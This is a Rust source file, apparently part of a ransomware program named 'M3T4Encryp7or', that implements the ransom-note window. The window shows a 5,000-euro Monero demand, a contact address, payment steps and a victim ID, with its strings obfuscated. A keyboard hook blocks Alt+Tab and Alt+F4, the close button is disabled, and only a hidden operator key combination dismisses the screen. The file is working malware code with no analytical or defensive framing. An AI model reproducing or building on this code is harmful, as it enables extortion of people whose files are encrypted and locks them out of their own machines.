use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::OnceLock;

pub static FILES_DONE: AtomicU64 = AtomicU64::new(0);
pub static BYTES_DONE: AtomicU64 = AtomicU64::new(0);
static DONE: AtomicBool = AtomicBool::new(false);
static VICTIM: OnceLock<String> = OnceLock::new();
static KEY_FILE: OnceLock<String> = OnceLock::new();
static CONTACT: OnceLock<String> = OnceLock::new();
static XMR: OnceLock<String> = OnceLock::new();

pub fn set_info(id: &str, key_file: &str, contact: &str, xmr: &str) {
    let _ = VICTIM.set(id.to_string());
    let _ = KEY_FILE.set(key_file.to_string());
    let _ = CONTACT.set(contact.to_string());
    let _ = XMR.set(xmr.to_string());
}

pub fn mark_done() {
    DONE.store(true, Ordering::Release);
}

#[cfg(not(windows))]
pub fn run() -> bool {
    false
}

#[cfg(windows)]
pub fn run() -> bool {
    unsafe { imp::run() }
}

#[cfg(windows)]
mod imp {
    use super::{BYTES_DONE, CONTACT, DONE, FILES_DONE, KEY_FILE, VICTIM, XMR};
    use std::cell::RefCell;
    use std::sync::atomic::{AtomicBool, AtomicIsize, Ordering};

    use windows_sys::core::PCWSTR;
    use windows_sys::Win32::Foundation::{HINSTANCE, HWND, LPARAM, LRESULT, RECT, SIZE, WPARAM};
    use windows_sys::Win32::Graphics::Gdi::{
        BeginPaint, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateFontW,
        CreateSolidBrush, DeleteDC, DeleteObject, EndPaint, FillRect, GetTextExtentPoint32W,
        InvalidateRect, SelectObject, SetBkMode, SetTextColor, TextOutW, UpdateWindow, HBITMAP,
        HBRUSH, HDC, HFONT, HGDIOBJ, PAINTSTRUCT, SRCCOPY,
    };
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows_sys::Win32::UI::HiDpi::{SetProcessDpiAwareness, PROCESS_PER_MONITOR_DPI_AWARE};
    use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
        GetAsyncKeyState, VK_ESCAPE, VK_F4, VK_MENU, VK_SHIFT, VK_TAB,
    };
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        CallNextHookEx, CreateWindowExW, DefWindowProcW, DestroyWindow, DispatchMessageW,
        GetClientRect, GetMessageW, GetSystemMetrics, KBDLLHOOKSTRUCT, LoadCursorW, LoadIconW,
        PostMessageW, PostQuitMessage, RegisterClassW, SendMessageW, SetTimer, SetWindowsHookExW,
        ShowWindow, TranslateMessage, UnhookWindowsHookEx, AdjustWindowRect, HICON, ICON_BIG,
        ICON_SMALL, IDC_ARROW, IDI_APPLICATION, MSG, SM_CXSCREEN, SM_CYSCREEN, SW_MINIMIZE, SW_SHOW,
        WH_KEYBOARD_LL, WM_CLOSE, WM_DESTROY, WM_DISPLAYCHANGE, WM_ERASEBKGND, WM_LBUTTONDOWN,
        WM_PAINT, WM_SETICON, WM_SYSCOMMAND, WM_TIMER, WNDCLASSW, WS_EX_TOPMOST,
        WS_OVERLAPPEDWINDOW, WS_VISIBLE,
    };

    const RED: u32 = 0x0026_26E8;
    const WHITE: u32 = 0x00F2_F2F2;
    const GRAY: u32 = 0x009A_9A9A;
    const GREEN: u32 = 0x004C_C066;
    const BLACK: u32 = 0x0000_0000;
    const DESIGN_H: f32 = 768.0;
    const TICK_MS: u32 = 500;
    const WIN_W: i32 = 1024;
    const WIN_H: i32 = 768;
    const WM_OPERATOR_EXIT: u32 = 0x8001;

    static EXIT_AFTER: AtomicBool = AtomicBool::new(false);
    static OPERATOR_UNLOCK: AtomicBool = AtomicBool::new(false);
    static HOOK: AtomicIsize = AtomicIsize::new(0);
    static WND: AtomicIsize = AtomicIsize::new(0);

    #[derive(Clone, Copy, PartialEq, Eq)]
    struct Snapshot {
        files: u64,
        bytes: u64,
        done: bool,
    }

    struct Gdi {
        dc: HDC,
        bmp: HBITMAP,
        old: HGDIOBJ,
        width: i32,
        height: i32,
        scale: f32,
        title: HFONT,
        subtitle: HFONT,
        amount: HFONT,
        label: HFONT,
        body: HFONT,
        small: HFONT,
        tiny: HFONT,
        button: HFONT,
        red: HBRUSH,
        green: HBRUSH,
        black: HBRUSH,
        panel: HBRUSH,
    }

    impl Gdi {
        unsafe fn new(hdc: HDC, width: i32, height: i32) -> Gdi {
            let dc = CreateCompatibleDC(hdc);
            let bmp = CreateCompatibleBitmap(hdc, width, height);
            let old = SelectObject(dc, bmp as HGDIOBJ);
            let scale = ((height as f32) / DESIGN_H).clamp(0.7, 1.4);
            let f = |px: f32, weight: i32, face: &str| font((px * scale) as i32, weight, face);
            Gdi {
                dc,
                bmp,
                old,
                width,
                height,
                scale,
                title: f(64.0, 900, "Consolas"),
                subtitle: f(26.0, 700, "Segoe UI"),
                amount: f(76.0, 900, "Segoe UI"),
                label: f(22.0, 700, "Segoe UI"),
                body: f(18.0, 400, "Consolas"),
                small: f(16.0, 400, "Consolas"),
                tiny: f(14.0, 400, "Consolas"),
                button: f(16.0, 700, "Segoe UI"),
                red: CreateSolidBrush(RED),
                green: CreateSolidBrush(GREEN),
                black: CreateSolidBrush(BLACK),
                panel: CreateSolidBrush(0x0016_1616),
            }
        }

        unsafe fn resize(&mut self, hdc: HDC, width: i32, height: i32) {
            if self.width == width && self.height == height {
                return;
            }
            SelectObject(self.dc, self.old);
            DeleteObject(self.bmp);
            DeleteDC(self.dc);
            let dc = CreateCompatibleDC(hdc);
            let bmp = CreateCompatibleBitmap(hdc, width, height);
            let old = SelectObject(dc, bmp as HGDIOBJ);
            self.dc = dc;
            self.bmp = bmp;
            self.old = old;
            self.width = width;
            self.height = height;
            self.scale = ((height as f32) / DESIGN_H).clamp(0.7, 1.4);
        }

        unsafe fn destroy(&mut self) {
            for font in [
                self.title, self.subtitle, self.amount, self.label, self.body, self.small,
                self.tiny, self.button,
            ] {
                DeleteObject(font);
            }
            for brush in [self.red, self.green, self.black, self.panel] {
                DeleteObject(brush);
            }
            SelectObject(self.dc, self.old);
            DeleteObject(self.bmp);
            DeleteDC(self.dc);
        }
    }

    thread_local! {
        static GDI: RefCell<Option<Gdi>> = const { RefCell::new(None) };
        static SNAPSHOT: RefCell<Option<Snapshot>> = const { RefCell::new(None) };
    }

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    unsafe fn font(px: i32, weight: i32, face: &str) -> HFONT {
        let name = wide(face);
        CreateFontW(
            -px, 0, 0, 0, weight, 0, 0, 0, 1, 0, 0, 0, 0, name.as_ptr(),
        )
    }

    fn snapshot() -> Snapshot {
        Snapshot {
            files: FILES_DONE.load(Ordering::Relaxed),
            bytes: BYTES_DONE.load(Ordering::Relaxed),
            done: DONE.load(Ordering::Acquire),
        }
    }

    fn button_rects(width: i32, height: i32, scale: f32) -> [(RECT, &'static str); 2] {
        let bw = (128.0 * scale) as i32;
        let bh = (34.0 * scale) as i32;
        let pad = (14.0 * scale) as i32;
        let right = width - pad;
        let bottom = height - pad;
        let close = RECT {
            left: right - bw,
            top: bottom - bh,
            right,
            bottom,
        };
        let min = RECT {
            left: close.left - pad - bw,
            top: close.top,
            right: close.left - pad,
            bottom,
        };
        [(min, "MINIMIZE"), (close, "CLOSE")]
    }

    unsafe extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
        if code >= 0 {
            let info = &*(lparam as *const KBDLLHOOKSTRUCT);
            let vk = info.vkCode as u16;
            let alt = (GetAsyncKeyState(VK_MENU as i32) as u16 & 0x8000) != 0;
            let ctrl = (GetAsyncKeyState(0x11) as u16 & 0x8000) != 0;
            let shift = (GetAsyncKeyState(VK_SHIFT as i32) as u16 & 0x8000) != 0;

            // Operator unlock: Ctrl+Alt+Shift+Q tears the window down.
            if ctrl && alt && shift && vk == b'Q' as u16 {
                OPERATOR_UNLOCK.store(true, Ordering::Release);
                let hwnd = WND.load(Ordering::Relaxed);
                if hwnd != 0 {
                    PostMessageW(hwnd as HWND, WM_OPERATOR_EXIT, 0, 0);
                }
                return 1;
            }

            let block = (alt && (vk == VK_TAB || vk == VK_ESCAPE || vk == VK_F4))
                || (ctrl && shift && vk == VK_ESCAPE)
                || (ctrl && vk == VK_ESCAPE && alt);
            if block {
                return 1;
            }
        }
        CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam)
    }

    unsafe extern "system" fn wndproc(
        hwnd: HWND,
        msg: u32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        match msg {
            WM_PAINT => {
                paint(hwnd);
                0
            }
            WM_ERASEBKGND => 1,
            WM_OPERATOR_EXIT => {
                DestroyWindow(hwnd);
                0
            }
            WM_TIMER => {
                let current = snapshot();
                let changed = SNAPSHOT.with(|slot| {
                    let mut slot = slot.borrow_mut();
                    if slot.as_ref() == Some(&current) {
                        false
                    } else {
                        *slot = Some(current);
                        true
                    }
                });
                if changed {
                    InvalidateRect(hwnd, std::ptr::null(), 0);
                }
                if DONE.load(Ordering::Acquire) && EXIT_AFTER.load(Ordering::Relaxed) {
                    DestroyWindow(hwnd);
                }
                0
            }
            WM_DISPLAYCHANGE => {
                SNAPSHOT.with(|slot| *slot.borrow_mut() = None);
                InvalidateRect(hwnd, std::ptr::null(), 0);
                0
            }
            WM_LBUTTONDOWN => {
                let x = (lparam as i32) & 0xffff;
                let y = ((lparam as i32) >> 16) & 0xffff;
                let mut rect: RECT = std::mem::zeroed();
                GetClientRect(hwnd, &mut rect);
                let width = rect.right - rect.left;
                let height = rect.bottom - rect.top;
                let scale = ((height as f32) / DESIGN_H).clamp(0.7, 1.4);
                for (r, _) in button_rects(width, height, scale) {
                    if x >= r.left && x <= r.right && y >= r.top && y <= r.bottom {
                        ShowWindow(hwnd, SW_MINIMIZE);
                        return 0;
                    }
                }
                0
            }
            WM_CLOSE => {
                // Titlebar X is inert. Only the operator combo can destroy us.
                if OPERATOR_UNLOCK.load(Ordering::Acquire) {
                    DestroyWindow(hwnd);
                }
                0
            }
            WM_SYSCOMMAND => {
                let command = wparam & 0xFFF0;
                const SC_CLOSE: usize = 0xF060;
                if command == SC_CLOSE {
                    return 0;
                }
                DefWindowProcW(hwnd, msg, wparam, lparam)
            }
            WM_DESTROY => {
                let hook = HOOK.swap(0, Ordering::Relaxed);
                if hook != 0 {
                    UnhookWindowsHookEx(hook as _);
                }
                GDI.with(|slot| {
                    if let Some(gdi) = slot.borrow_mut().as_mut() {
                        gdi.destroy();
                    }
                });
                PostQuitMessage(0);
                0
            }
            _ => DefWindowProcW(hwnd, msg, wparam, lparam),
        }
    }

    /// Loads the embedded icon (resource id 1). Returns the fallback when the
    /// PE carries no icon resource — e.g. builds without icon.ico present.
    unsafe fn load_icon(hinstance: HINSTANCE, fallback: PCWSTR) -> HICON {
        let embedded = LoadIconW(hinstance, 1 as PCWSTR);
        if !embedded.is_null() {
            return embedded;
        }
        LoadIconW(std::ptr::null_mut(), fallback)
    }

    pub unsafe fn run() -> bool {
        let _ = SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE);
        EXIT_AFTER.store(
            std::env::var("R4080_EXIT_AFTER")
                .map(|v| v == "1")
                .unwrap_or(false),
            Ordering::Relaxed,
        );

        let class = wide(&crate::obf!("M3T4Encryp7orWnd"));
        let title = wide(&crate::obf!("M3T4Encryp7or"));
        let hinstance = GetModuleHandleW(std::ptr::null());

        // Resource id 1 comes from icon.rc compiled by build.rs. Falls back to
        // the stock application icon when the build had no icon.ico.
        let icon = load_icon(hinstance, IDI_APPLICATION);

        let wc = WNDCLASSW {
            style: 0,
            lpfnWndProc: Some(wndproc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: hinstance,
            hIcon: icon,
            hCursor: LoadCursorW(std::ptr::null_mut(), IDC_ARROW),
            hbrBackground: std::ptr::null_mut(),
            lpszMenuName: std::ptr::null(),
            lpszClassName: class.as_ptr(),
        };
        RegisterClassW(&wc);

        let mut frame = RECT {
            left: 0,
            top: 0,
            right: WIN_W,
            bottom: WIN_H,
        };
        AdjustWindowRect(&mut frame, WS_OVERLAPPEDWINDOW, 0);
        let w = frame.right - frame.left;
        let h = frame.bottom - frame.top;
        let screen_w = GetSystemMetrics(SM_CXSCREEN);
        let screen_h = GetSystemMetrics(SM_CYSCREEN);
        let x = ((screen_w - w) / 2).max(0);
        let y = ((screen_h - h) / 2).max(0);

        let hwnd = CreateWindowExW(
            WS_EX_TOPMOST,
            class.as_ptr(),
            title.as_ptr(),
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            w,
            h,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            hinstance,
            std::ptr::null(),
        );
        if hwnd.is_null() {
            return false;
        }
        WND.store(hwnd as isize, Ordering::Release);

        if !icon.is_null() {
            SendMessageW(hwnd, WM_SETICON, ICON_BIG as WPARAM, icon as LPARAM);
            SendMessageW(hwnd, WM_SETICON, ICON_SMALL as WPARAM, icon as LPARAM);
        }

        ShowWindow(hwnd, SW_SHOW);
        UpdateWindow(hwnd);
        SetTimer(hwnd, 1, TICK_MS, None);

        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook), hinstance, 0);
        HOOK.store(hook as isize, Ordering::Relaxed);

        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        true
    }

    unsafe fn paint(hwnd: HWND) {
        let mut ps: PAINTSTRUCT = std::mem::zeroed();
        let hdc = BeginPaint(hwnd, &mut ps);

        let mut rect: RECT = std::mem::zeroed();
        GetClientRect(hwnd, &mut rect);
        let width = rect.right - rect.left;
        let height = rect.bottom - rect.top;
        if width <= 0 || height <= 0 {
            EndPaint(hwnd, &ps);
            return;
        }

        GDI.with(|slot| {
            let mut slot = slot.borrow_mut();
            let gdi = slot.get_or_insert_with(|| Gdi::new(hdc, width, height));
            gdi.resize(hdc, width, height);

            let dc = gdi.dc;
            let scale = gdi.scale;
            let full = RECT {
                left: 0,
                top: 0,
                right: width,
                bottom: height,
            };
            FillRect(dc, &full, gdi.black);
            SetBkMode(dc, 1);

            let done = DONE.load(Ordering::Acquire);
            let accent = if done { GREEN } else { RED };

            draw_hazard(dc, width, 0, (10.0 * scale) as i32, gdi.red);
            draw_hazard(dc, width, height - (10.0 * scale) as i32, height, gdi.red);

            let mut y = (26.0 * scale) as i32;
            center(
                dc,
                gdi.title,
                accent,
                y,
                &crate::obf!("M3T4Encryp7or"),
                width,
            );
            y += (74.0 * scale) as i32;

            center(
                dc,
                gdi.subtitle,
                WHITE,
                y,
                &crate::obf!("YOUR FILES HAVE BEEN ENCRYPTED"),
                width,
            );
            y += (46.0 * scale) as i32;

            center(
                dc,
                gdi.amount,
                accent,
                y,
                &crate::obf!("\u{20AC} 5,000"),
                width,
            );
            y += (80.0 * scale) as i32;
            center(
                dc,
                gdi.label,
                WHITE,
                y,
                &crate::obf!("IN MONERO (XMR)"),
                width,
            );
            y += (34.0 * scale) as i32;

            let xmr = XMR.get().map(String::as_str).unwrap_or("NOT CONFIGURED");
            y = draw_chunked(dc, gdi.body, WHITE, y, width, xmr, 64, scale);
            y += (8.0 * scale) as i32;

            let default_contact = crate::obf!("recovery-service@protonmail.com");
            let contact = CONTACT.get().map(String::as_str).unwrap_or(&default_contact);
            center(
                dc,
                gdi.body,
                WHITE,
                y,
                &format!("{} {contact}", crate::obf!("CONTACT:")),
                width,
            );
            y += (36.0 * scale) as i32;

            let key = KEY_FILE
                .get()
                .map(String::as_str)
                .unwrap_or("RECOVERY_KEY_<ID>.bin");
            center(
                dc,
                gdi.body,
                GREEN,
                y,
                &crate::obf!("PAYMENT AND RECOVERY - FOLLOW EXACTLY"),
                width,
            );
            y += (30.0 * scale) as i32;
            let steps = [
                format!("{} {key} {}", crate::obf!("1.  Find"), crate::obf!("on your Desktop or drive root.")),
                format!("{} {contact}", crate::obf!("2.  Attach that file and send it to:")),
                crate::obf!("3.  Pay \u{20AC}5,000 in XMR to the address above."),
                crate::obf!("4.  Receive the decryptor and recovery instructions."),
            ];
            for step in steps {
                center(dc, gdi.small, WHITE, y, &step, width);
                y += (24.0 * scale) as i32;
            }

            y += (8.0 * scale) as i32;
            let victim = VICTIM.get().map(String::as_str).unwrap_or("PENDING");
            let files = FILES_DONE.load(Ordering::Relaxed);
            let mib = BYTES_DONE.load(Ordering::Relaxed) / (1024 * 1024);
            center(
                dc,
                gdi.small,
                GRAY,
                y,
                &format!(
                    "{} {victim}      {} {files}      {} {mib} MiB",
                    crate::obf!("VICTIM ID:"),
                    crate::obf!("FILES:"),
                    crate::obf!("DATA:")
                ),
                width,
            );

            let bar_y = height - (108.0 * scale) as i32;
            let bar_w = ((width as f32) * 0.55) as i32;
            let bar_h = (18.0 * scale) as i32;
            draw_bar(
                dc,
                (width - bar_w) / 2,
                bar_y,
                bar_w,
                bar_h,
                if done { gdi.green } else { gdi.red },
                done,
            );

            let status = if done {
                crate::obf!("ENCRYPTION COMPLETE - SEND THE RECOVERY KEY FILE")
            } else {
                crate::obf!("ENCRYPTION IN PROGRESS - DO NOT POWER OFF")
            };
            center(
                dc,
                gdi.label,
                accent,
                bar_y + (24.0 * scale) as i32,
                &status,
                width,
            );

            let panel_h = (54.0 * scale) as i32;
            let panel = RECT {
                left: 0,
                top: height - panel_h,
                right: width,
                bottom: height,
            };
            FillRect(dc, &panel, gdi.panel);
            draw_hazard(dc, width, height - panel_h, height - panel_h + 2, gdi.red);
            for (r, label) in button_rects(width, height, scale) {
                FillRect(dc, &r, if label == "CLOSE" { gdi.red } else { gdi.panel });
                let border = [
                    RECT {
                        left: r.left,
                        top: r.top,
                        right: r.right,
                        bottom: r.top + 1,
                    },
                    RECT {
                        left: r.left,
                        top: r.bottom - 1,
                        right: r.right,
                        bottom: r.bottom,
                    },
                ];
                for b in border {
                    FillRect(dc, &b, gdi.red);
                }
                center_in(dc, gdi.button, WHITE, r, label);
            }
            center_left(
                dc,
                gdi.tiny,
                GRAY,
                (18.0 * scale) as i32,
                height - (38.0 * scale) as i32,
                &crate::obf!("This window stays on top. Use the taskbar to browse your files."),
            );

            BitBlt(hdc, 0, 0, width, height, dc, 0, 0, SRCCOPY);
        });

        EndPaint(hwnd, &ps);
    }

    unsafe fn draw_hazard(hdc: HDC, width: i32, top: i32, bottom: i32, brush: HBRUSH) {
        let mut x = 0;
        while x < width {
            let segment = RECT {
                left: x,
                top,
                right: (x + 38).min(width),
                bottom,
            };
            FillRect(hdc, &segment, brush);
            x += 76;
        }
    }

    unsafe fn draw_bar(
        hdc: HDC,
        x: i32,
        y: i32,
        width: i32,
        height: i32,
        brush: HBRUSH,
        done: bool,
    ) {
        let frame = [
            RECT {
                left: x,
                top: y,
                right: x + width,
                bottom: y + 2,
            },
            RECT {
                left: x,
                top: y + height - 2,
                right: x + width,
                bottom: y + height,
            },
            RECT {
                left: x,
                top: y,
                right: x + 2,
                bottom: y + height,
            },
            RECT {
                left: x + width - 2,
                top: y,
                right: x + width,
                bottom: y + height,
            },
        ];
        for rect in frame {
            FillRect(hdc, &rect, brush);
        }

        if done {
            let fill = RECT {
                left: x + 4,
                top: y + 4,
                right: x + width - 4,
                bottom: y + height - 4,
            };
            FillRect(hdc, &fill, brush);
            return;
        }

        let block = (width / 6).max(48);
        let mut bx = x + 4;
        while bx + block <= x + width - 4 {
            let seg = RECT {
                left: bx,
                top: y + 4,
                right: bx + block - 6,
                bottom: y + height - 4,
            };
            FillRect(hdc, &seg, brush);
            bx += block;
        }
    }

    unsafe fn draw_chunked(
        hdc: HDC,
        font: HFONT,
        color: u32,
        mut y: i32,
        width: i32,
        text: &str,
        chunk: usize,
        scale: f32,
    ) -> i32 {
        if text.is_empty() {
            return y;
        }
        let chars: Vec<char> = text.chars().collect();
        for part in chars.chunks(chunk) {
            let line: String = part.iter().collect();
            center(hdc, font, color, y, &line, width);
            y += (22.0 * scale) as i32;
        }
        y
    }

    unsafe fn center(hdc: HDC, font: HFONT, color: u32, y: i32, text: &str, width: i32) {
        let units: Vec<u16> = text.encode_utf16().collect();
        let previous = SelectObject(hdc, font as HGDIOBJ);
        SetTextColor(hdc, color);
        let mut size: SIZE = std::mem::zeroed();
        GetTextExtentPoint32W(hdc, units.as_ptr(), units.len() as i32, &mut size);
        let x = ((width - size.cx) / 2).max(20);
        TextOutW(hdc, x, y, units.as_ptr(), units.len() as i32);
        SelectObject(hdc, previous);
    }

    unsafe fn center_left(hdc: HDC, font: HFONT, color: u32, x: i32, y: i32, text: &str) {
        let units: Vec<u16> = text.encode_utf16().collect();
        let previous = SelectObject(hdc, font as HGDIOBJ);
        SetTextColor(hdc, color);
        TextOutW(hdc, x, y, units.as_ptr(), units.len() as i32);
        SelectObject(hdc, previous);
    }

    unsafe fn center_in(hdc: HDC, font: HFONT, color: u32, rect: RECT, text: &str) {
        let units: Vec<u16> = text.encode_utf16().collect();
        let previous = SelectObject(hdc, font as HGDIOBJ);
        SetTextColor(hdc, color);
        let mut size: SIZE = std::mem::zeroed();
        GetTextExtentPoint32W(hdc, units.as_ptr(), units.len() as i32, &mut size);
        let x = rect.left + ((rect.right - rect.left) - size.cx) / 2;
        let y = rect.top + ((rect.bottom - rect.top) - size.cy) / 2;
        TextOutW(hdc, x, y, units.as_ptr(), units.len() as i32);
        SelectObject(hdc, previous);
    }
}
